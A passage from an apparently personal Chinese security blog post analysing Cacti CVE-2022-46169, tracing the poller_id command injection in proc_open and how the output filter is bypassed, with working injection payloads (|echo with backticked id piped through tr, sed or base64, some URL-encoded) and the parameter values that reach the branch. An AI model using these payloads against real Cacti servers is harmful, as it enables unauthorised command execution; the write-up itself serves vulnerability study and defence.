class="string">&#x27;U&#x27;</span>;</span><br><span class="line">							&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">								<span class="variable">$output</span> = <span class="title function_ invoke__">cacti_snmp_session_get</span>(<span class="variable">$session</span>, <span class="variable">$item</span>[<span class="string">&#x27;arg1&#x27;</span>]);</span><br><span class="line">								<span class="variable">$session</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">							&#125;</span><br><span class="line"></span><br><span class="line">							<span class="keyword">if</span> (<span class="title function_ invoke__">prepare_validate_result</span>(<span class="variable">$output</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">								<span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$output</span>) &gt; <span class="number">20</span>) &#123;</span><br><span class="line">									<span class="variable">$strout</span> = <span class="number">20</span>;</span><br><span class="line">								&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">									<span class="variable">$strout</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$output</span>);</span><br><span class="line">								&#125;</span><br><span class="line"></span><br><span class="line">								<span class="variable">$output</span> = <span class="string">&#x27;U&#x27;</span>;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">						<span class="variable">$return</span>[<span class="variable">$i</span>][<span class="string">&#x27;value&#x27;</span>]         = <span class="variable">$output</span>;</span><br><span class="line">						<span class="variable">$return</span>[<span class="variable">$i</span>][<span class="string">&#x27;rrd_name&#x27;</span>]      = <span class="variable">$item</span>[<span class="string">&#x27;rrd_name&#x27;</span>];</span><br><span class="line">						<span class="variable">$return</span>[<span class="variable">$i</span>][<span class="string">&#x27;local_data_id&#x27;</span>] = <span class="variable">$local_data_id</span>;</span><br><span class="line"></span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">case</span> POLLER_ACTION_SCRIPT: <span class="comment">/* script (popen) */</span></span><br><span class="line">						<span class="variable">$output</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">exec_poll</span>(<span class="variable">$item</span>[<span class="string">&#x27;arg1&#x27;</span>]));</span><br><span class="line"></span><br><span class="line">						<span class="keyword">if</span> (<span class="title function_ invoke__">prepare_validate_result</span>(<span class="variable">$output</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">							<span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$output</span>) &gt; <span class="number">20</span>) &#123;</span><br><span class="line">								<span class="variable">$strout</span> = <span class="number">20</span>;</span><br><span class="line">							&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">								<span class="variable">$strout</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$output</span>);</span><br><span class="line">							&#125;</span><br><span class="line"></span><br><span class="line">							<span class="variable">$output</span> = <span class="string">&#x27;U&#x27;</span>;</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">						<span class="variable">$return</span>[<span class="variable">$i</span>][<span class="string">&#x27;value&#x27;</span>]         = <span class="variable">$output</span>;</span><br><span class="line">						<span class="variable">$return</span>[<span class="variable">$i</span>][<span class="string">&#x27;rrd_name&#x27;</span>]      = <span class="variable">$item</span>[<span class="string">&#x27;rrd_name&#x27;</span>];</span><br><span class="line">						<span class="variable">$return</span>[<span class="variable">$i</span>][<span class="string">&#x27;local_data_id&#x27;</span>] = <span class="variable">$local_data_id</span>;</span><br><span class="line"></span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">case</span> POLLER_ACTION_SCRIPT_PHP: <span class="comment">/* script (php script server) */</span></span><br><span class="line">						<span class="variable">$cactides</span> = <span class="keyword">array</span>(</span><br><span class="line">							<span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;r&#x27;</span>), <span class="comment">// stdin is a pipe that the child will read from</span></span><br><span class="line">							<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>), <span class="comment">// stdout is a pipe that the child will write to</span></span><br><span class="line">							<span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)  <span class="comment">// stderr is a pipe to write to</span></span><br><span class="line">						);</span><br><span class="line"></span><br><span class="line">						<span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;proc_open&#x27;</span>)) &#123;</span><br><span class="line">							<span class="variable">$cactiphp</span> = <span class="title function_ invoke__">proc_open</span>(<span class="title function_ invoke__">read_config_option</span>(<span class="string">&#x27;path_php_binary&#x27;</span>) . <span class="string">&#x27; -q &#x27;</span> . <span class="variable">$config</span>[<span class="string">&#x27;base_path&#x27;</span>] . <span class="string">&#x27;/script_server.php realtime &#x27;</span> . <span class="variable">$poller_id</span>, <span class="variable">$cactides</span>, <span class="variable">$pipes</span>);</span><br><span class="line">							<span class="variable">$output</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="number">1024</span>);</span><br><span class="line">							<span class="variable">$using_proc_function</span> = <span class="literal">true</span>;</span><br><span class="line">						&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">							<span class="variable">$using_proc_function</span> = <span class="literal">false</span>;</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">						<span class="keyword">if</span> (<span class="variable">$using_proc_function</span> == <span class="literal">true</span>) &#123;</span><br><span class="line">							<span class="variable">$output</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">exec_poll_php</span>(<span class="variable">$item</span>[<span class="string">&#x27;arg1&#x27;</span>], <span class="variable">$using_proc_function</span>, <span class="variable">$pipes</span>, <span class="variable">$cactiphp</span>)));</span><br><span class="line"></span><br><span class="line">							<span class="keyword">if</span> (<span class="title function_ invoke__">prepare_validate_result</span>(<span class="variable">$output</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">								<span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$output</span>) &gt; <span class="number">20</span>) &#123;</span><br><span class="line">									<span class="variable">$strout</span> = <span class="number">20</span>;</span><br><span class="line">								&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">									<span class="variable">$strout</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$output</span>);</span><br><span class="line">								&#125;</span><br><span class="line"></span><br><span class="line">								<span class="variable">$output</span> = <span class="string">&#x27;U&#x27;</span>;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">							<span class="variable">$output</span> = <span class="string">&#x27;U&#x27;</span>;</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">						<span class="variable">$return</span>[<span class="variable">$i</span>][<span class="string">&#x27;value&#x27;</span>]         = <span class="variable">$output</span>;</span><br><span class="line">						<span class="variable">$return</span>[<span class="variable">$i</span>][<span class="string">&#x27;rrd_name&#x27;</span>]      = <span class="variable">$item</span>[<span class="string">&#x27;rrd_name&#x27;</span>];</span><br><span class="line">						<span class="variable">$return</span>[<span class="variable">$i</span>][<span class="string">&#x27;local_data_id&#x27;</span>] = <span class="variable">$local_data_id</span>;</span><br><span class="line"></span><br><span class="line">						<span class="keyword">if</span> ((<span class="variable">$using_proc_function</span> == <span class="literal">true</span>) &amp;&amp; (<span class="variable">$script_server_calls</span> &gt; <span class="number">0</span>)) &#123;</span><br><span class="line">							<span class="comment">/* close php server process */</span></span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="string">&quot;quit\r\n&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">0</span>]);</span><br><span class="line">							<span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br><span class="line">							<span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">							<span class="variable">$return_value</span> = <span class="title function_ invoke__">proc_close</span>(<span class="variable">$cactiphp</span>);</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">					<span class="variable">$i</span>++;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">print</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$return</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们真正的利用点就在这个函数里面</p>
<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725192635117.png" alt="image-20250725192635117"></p>
<p>这里 我们需要get传参 <code>local_data_ids</code> ，<code>host_id</code>，<code>poller_id</code>，</p>
<p>我们也可以发现，这里只有<code>local_data_ids</code> 后面加了s，大概率就是一个数组了，因为是复数嘛</p>
<p>，<code>get_nfilter_request_var</code> 他这里获取好像也过滤了我们的 get传参，进入分析</p>
<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725192854424.png" alt="image-20250725192854424"></p>
<p>很简单的一个函数</p>
<p>看起来也并没有什么过滤</p>
<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725193938615.png" alt="image-20250725193938615"></p>
<p>这里也成功的取到我们传入的参数</p>
<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725194343369.png" alt="image-20250725194343369"></p>
<p>我们真正的执行语句就在这一句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cactiphp = proc_open(read_config_option(&#x27;path_php_binary&#x27;) . &#x27; -q &#x27; . $config[&#x27;base_path&#x27;] . &#x27;/script_server.php realtime &#x27; . $poller_id, $cactides, $pipes);</span><br></pre></td></tr></table></figure>

<p>他先读取配置里 PHP 解释器的路径，确保用正确的 PHP 二进制执行，然后与目标执行的 PHP 脚本路径进行拼接，然后又与 <code>$poller_id</code> 拼接，最终执行了我们的rce</p>
<p>接下来我们倒着分析回去</p>
<p>看看如何让他进入这个分支</p>
<p><code>POLLER_ACTION_SCRIPT_PHP</code> 想让他进入这个分支，</p>
<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725202424473.png" alt="image-20250725202424473"></p>
<p>全局搜索发现这个的值为2</p>
<p>所以说这里我们 需要找到对应的action &#x3D; 2 的时候</p>
<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725203039500.png" alt="image-20250725203039500"></p>
<p>往上发现，他这里的action 是通过items 这个值传入的</p>
<p>也就是他会在数据库去查询，查询到这个action为2的</p>
<p>才会进入我们想要的分支</p>
<p>也就是说，我们需要控制 <code>host_id</code> 和<code>local_data_id</code> 这两个的值，让他代入去数据库中查询，精确查找出这个action&#x3D;2，</p>
<p>然后我们去 连接一下数据库查询一下 poller_item 这个字段</p>
<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725203659403.png" alt="image-20250725203659403"></p>
<p>查询后发现，只有 id&#x3D;6的时候这个action才是2</p>
<p>所以这个时候，我们只需要拿出 <code>host_id</code> 和<code>local_data_id</code> 这两个的值</p>
<p>host_id &#x3D; 1 </p>
<p>local_data_id &#x3D; 6</p>
<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725203844668.png" alt="image-20250725203844668"></p>
<p>然后他就会进入这个进行循环，这时候这个action 就是2 ，也就成功进入了我们的分支</p>
<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725204401780.png" alt="image-20250725204401780"></p>
<p>然后这里我们 local_data_ids 必须传入一个数组，不然他进这里这个循环就会报错</p>
<p>所以这里我们传的<code>local_data_ids[0]=6</code></p>
<p>最后她走到我们的proc_open这里执行任意的函数，我们的rce 也生效了</p>
<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725204554766.png" alt="image-20250725204554766"></p>
<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725204626198.png" alt="image-20250725204626198"></p>
<p>但是这里他没有回显</p>
<p>我们继续深入研究一下，让他怎么才有回显</p>
<h4 id="如何回显"><a href="#如何回显" class="headerlink" title="如何回显"></a>如何回显</h4><p>我们知道<code>proc_open</code> 这个函数 能通过管道来输出，输入</p>
<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725211924880.png" alt="image-20250725211924880"></p>
<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725211846268.png" alt="image-20250725211846268"></p>
<p>这里正好他用fgets 从管道里面读取了1024个字节</p>
<p>然后他就会进入</p>
<p><code>using_proc_function</code></p>
<p> 这个判断里面</p>
<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725212101793.png" alt="image-20250725212101793"></p>
<p><code>$output = trim(str_replace(&quot;\n&quot;, &#39;&#39;, exec_poll_php($item[&#39;arg1&#39;], $using_proc_function, $pipes, $cactiphp)));</code></p>
<p>这里他先用exec_poll_php 执行了一个php脚本</p>
<p>然后str_replace 去除结果中的换行符（<code>\n</code>），</p>
<p>trim去除前后空白字符（包括空格、制表符等）</p>
<p>进入看看<code>exec_poll_php</code> 具体干了些什么</p>
<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725215622178.png" alt="image-20250725215622178"></p>
<p>我们看到，他这里读了8192个字节，是否会将我们的执行结果也一起读出来呢？</p>
<p><code>prepare_validate_result</code></p>
<p>这个函数对<code>output</code> 做了过滤</p>
<p>为false，就会直接将output 赋值为‘U’，所以我们要想办法绕过</p>
<p>进入进行分析</p>
<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725212656843.png" alt="image-20250725212656843"></p>
<p>这里他先去掉了首尾的 单引号，双引号，换行符，回车</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$result</span>)) &#123;</span><br><span class="line">	<span class="title function_ invoke__">dsv_log</span>(<span class="string">&#x27;prepare_validate_result&#x27;</span>,<span class="string">&#x27;data is numeric&#x27;</span>);</span><br><span class="line"> 	<span class="keyword">return</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>

<p>这里他判断是否是纯数字，是就直接返回true，但是这里我们的$output不可能是纯数字，所以直接pass</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> (<span class="variable">$result</span> == <span class="string">&#x27;U&#x27;</span>) &#123;</span><br><span class="line">	<span class="title function_ invoke__">dsv_log</span>(<span class="string">&#x27;prepare_validate_result&#x27;</span>, <span class="string">&#x27;data is U&#x27;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>

<p>这里他判断值是不是U，不可能，也pass</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> (<span class="title function_ invoke__">is_hexadecimal</span>(<span class="variable">$result</span>)) &#123;</span><br><span class="line">	<span class="title function_ invoke__">dsv_log</span>(<span class="string">&#x27;prepare_validate_result&#x27;</span>, <span class="string">&#x27;data is hex&#x27;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">hexdec</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure>

<p>这里看函数名像判断16进制，有可能，保留，（因为我们可以将输出结果通过管道符 转化为16进制）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> (<span class="title function_ invoke__">substr_count</span>(<span class="variable">$result</span>, <span class="string">&#x27;:&#x27;</span>) || <span class="title function_ invoke__">substr_count</span>(<span class="variable">$result</span>, <span class="string">&#x27;!&#x27;</span>)) &#123;</span><br><span class="line">		<span class="comment">/* looking for name value pairs */</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">substr_count</span>(<span class="variable">$result</span>, <span class="string">&#x27; &#x27;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="title function_ invoke__">dsv_log</span>(<span class="string">&#x27;prepare_validate_result&#x27;</span>, <span class="string">&#x27;data has no spaces&#x27;</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>

<p>这里先判断是否包含冒号（:）或感叹号（!），</p>
<p>在判断如果没有空格，就返回true，也有可能保留</p>
<p>最后一个else 里面直接将非数字字符全部清除了，只保留数字，pass</p>
<p>所以我们的目标就落在了</p>
<p><code>elseif (is_hexadecimal($result))</code></p>
<p><code>lseif (substr_count($result, &#39;:&#39;) || substr_count($result, &#39;!&#39;)) &#123; if (substr_count($result, &#39; &#39;) == 0) &#123;</code></p>
<p>这两个判断里面，先分析16进制</p>
<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725213756651.png" alt="image-20250725213756651"></p>
<p>1.清洗输入</p>
<p><code>$hexstr = str_replace(array(&#39; &#39;, &#39;-&#39;), &#39;:&#39;, trim($result));</code></p>
<p>他先将输入字符串中的 空格和中划线（如 <code>&quot;00-1A-2B&quot;</code> 或 <code>&quot;00 1A 2B&quot;</code>）统一转换为 冒号分隔（如 <code>&quot;00:1A:2B&quot;</code>）。</p>
<p>并用 <code>trim</code> 去除前后空白字符。</p>
<p>2.按冒号分隔为数组</p>
<p><code>$parts = explode(&#39;:&#39;, $hexstr);</code></p>
<p>将统一格式的字符串切成数组</p>
<p>例如输入 <code>&quot;00:1A:2B:3C:4D:5E&quot;</code> → <code>[&quot;00&quot;, &quot;1A&quot;, &quot;2B&quot;, &quot;3C&quot;, &quot;4D&quot;, &quot;5E&quot;]</code></p>
<p>3.逐个检查每段是否为合法的两位十六进制数</p>
<p><code>foreach($parts as $part) &#123;</code><br>	<code>if (strlen($part) != 2) return false;</code><br>	<code>if (ctype_xdigit($part) == false) return false;</code><br><code>&#125;</code></p>
<p>每段必须是 长度为 2 的字符串，例如 <code>&quot;0F&quot;</code>, <code>&quot;1a&quot;</code>。</p>
<p>必须全部是 十六进制字符（0-9, A-F, a-f），否则返回 <code>false</code>。</p>
<p>所有部分都符合条件，返回 <code>true</code>，表示是合法的十六进制格式。</p>
<p>然后我们就要想办法 如何将输出的结果转换为 类似于mac地址这种的格式</p>
<p>问问大模型，给了4种方法</p>
<ol>
<li><p>使用 <code>xxd</code> + <code>sed</code> 或 <code>awk</code>（处理二进制&#x2F;十六进制数据）</p>
<p><code>echo -n &quot;abcdef&quot; | xxd -p | sed &#39;s/\(..\)/\1:/g; s/:$//&#39;</code></p>
<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725214705152.png" alt="image-20250725214705152"></p>
<p>本地测试有效果</p>
<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725214725146.png" alt="image-20250725214725146"></p>
<p>docker环境内显示没有xdd，所以这个有可能可以用</p>
</li>
<li><p>使用 <code>hexdump</code></p>
<p><code>echo -n &quot;abcdef&quot; | hexdump -v -e &#39;1/1 &quot;%02x:&quot;&#39; | sed &#39;s/:$//&#39;</code></p>
<p>这个跟上面的一样，也有可能环境中没有这个命令</p>
</li>
<li><p>用 <code>xxd</code> 处理文件并转换格式</p>
<p><code>xxd -p /bin/ls | tr -d &#39;\n&#39; | sed &#39;s/\(..\)/\1:/g; s/:$//&#39;</code></p>
<p>pass，跟第一种差不多</p>
</li>
<li><p>用 Bash + printf</p>
<p><code>hex=&quot;001a2b3c4d5e&quot;</code><br><code>echo &quot;$hex&quot; | sed &#39;s/../&amp;:/g; s/:$//&#39;</code></p>
<p>第四种直接pass，因为我们不能保证原文本就是十六进制的字符串</p>
</li>
</ol>
<p>所以我们找到了两种有效的方式，可以转16进制</p>
<p>然后分析下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> (<span class="title function_ invoke__">substr_count</span>(<span class="variable">$result</span>, <span class="string">&#x27;:&#x27;</span>) || <span class="title function_ invoke__">substr_count</span>(<span class="variable">$result</span>, <span class="string">&#x27;!&#x27;</span>)) &#123;</span><br><span class="line">		<span class="comment">/* looking for name value pairs */</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">substr_count</span>(<span class="variable">$result</span>, <span class="string">&#x27; &#x27;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="title function_ invoke__">dsv_log</span>(<span class="string">&#x27;prepare_validate_result&#x27;</span>, <span class="string">&#x27;data has no spaces&#x27;</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>

<p>如何让我们的输出包含<code>：</code>或者<code>！</code> 且还没有空格呢？</p>
<p>第一个判断很好绕过，我们直接传一个冒号或者感叹号就行。</p>
<p>第二个也很好想到，通过base64编码。</p>
<p>问了问大模型</p>
<ol>
<li>使用 <code>tr</code> 删除所有空格</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">|echo &quot;test\r\n :`id | tr -d &#x27; &#x27;`&quot;;</span><br><span class="line">转一下 urlencode</span><br><span class="line">%7Cecho%20%22test%5Cr%5Cn%20:%60id%20%7C%20tr%20-d%20&#x27;%20&#x27;%60%22;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725225350740.png" alt="image-20250725225350740"></p>
<p>成功</p>
<ol start="2">
<li><p>使用 <code>sed</code> 删除所有空格字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;test\r\n :`id | sed &#x27;s/ //g&#x27;`&quot;;</span><br><span class="line">转一下 urlencode</span><br><span class="line">%7Cecho%20%22test%5Cr%5Cn%20:%60id%20%7C%20sed%20&#x27;s/%20//g&#x27;%60%22;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725225725218.png" alt="image-20250725225725218"></p>
<p>没问题</p>
</li>
<li><p>删除所有空白字符（包括空格、制表符、换行符）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">|echo &quot;test\r\n :`id | tr -d &#x27;[:space:]&#x27;`&quot;;</span><br><span class="line">|echo &quot;test\r\n :`id | sed &#x27;s/[[:space:]]//g&#x27;`&quot;;</span><br></pre></td></tr></table></figure>

<p>道理跟前两种差不多</p>
<p>也可以执行，这里就不贴图了</p>
</li>
<li><p>base 64</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|echo &quot;test\r\n :`id | base64`&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725230541249.png" alt="image-20250725230541249"></p>
<p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725230549777.png" alt="image-20250725230549777"></p>
<p>成功</p>
</li>
</ol>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>rce 执行归结于 <code>proc_open</code>函数  他直接进行了拼接，且未对我们用户的输入做过滤，导致了rce</p>
<p>鉴权函数也可以优化，最简单的方法就是改变一下那个数组的顺序，将用户不能控制的ip放在最前面，让他循环一次就会直接判断</p>
<p>而且他这个回显的过滤也很好绕过。</p>
<p>但是终归还是没对用户的输入做过滤</p>
</div><div class="post-copyright"><div class="post-copyright-author"><span class="post-copyright-meta">本文作者: </span><span class="post-copyright-info"><a href="mailto:undefined">JGwebre</a></span></div><div class="post-copyright-type"><span class="post-copyright-meta">本文链接: </span><span class="post-copyright-info"><a href="https://heisha123.github.io/2025/07/25/cacti-CVE-2022-46169/">https://heisha123.github.io/2025/07/25/cacti-CVE-2022-46169/</a></span></div><div class="post-copyright-notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本站点所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://heisha123.github.io">JG的个人博客</a>！</span></div></div><div class="post-copyright valine" id="comments-container"><script src="//unpkg.com/valine@1.4.14/dist/Valine.min.js"></script><script>let arr = location.href.split('/#more')[0].split('/');
let title = arr[arr.length - 1];
if (title === '') {
    title = arr[arr.length - 2];
}
var flag = false;
var gitFun = function () {
    try {
        var valineObj = window.GLOBAL_CONFIG.valine;
        new Valine({
            el: "#comments-container",
            ...valineObj
        });
        flag = true;
    } catch (e) {
        flag = false;
    }
}
var setIn = setInterval(() => {
    if (!flag) {
        gitFun();
    } else {
        clearInterval(setIn);
    }
}, 200);</script></div></article><div id="pagination"><div class="prev-post pull-left"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/"><i class="fas fa-angle-left">&nbsp;</i><span>upload-labs 靶场</span></a></div><div class="next-post pull-right"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"><span>rce的一些奇技淫巧</span><span>&nbsp;</span><i class="fas fa-angle-right"></i></a></div></div><!--div!= paginator()--></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fas fa-file-o"></i></span><span id="busuanzi_value_page_pv"></span><span></span></div><div class="copyright">&copy;2025 By JGwebre</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/copy.js"></script><!--script(src=url)--><div class="search-dialog"><div id="algolia-search-title">Algolia</div><div class="search-close-button"><i class="fa fa-times"></i></div><!--div#current-refined-values--><!--div#clear-all--><div id="search-box"></div><!--div#refinement-list--><hr><div id="hits"></div><div id="algolia-pagination"></div></div><div class="search-mask"></div><script src="/js/search/algolia.js"></script></body></html>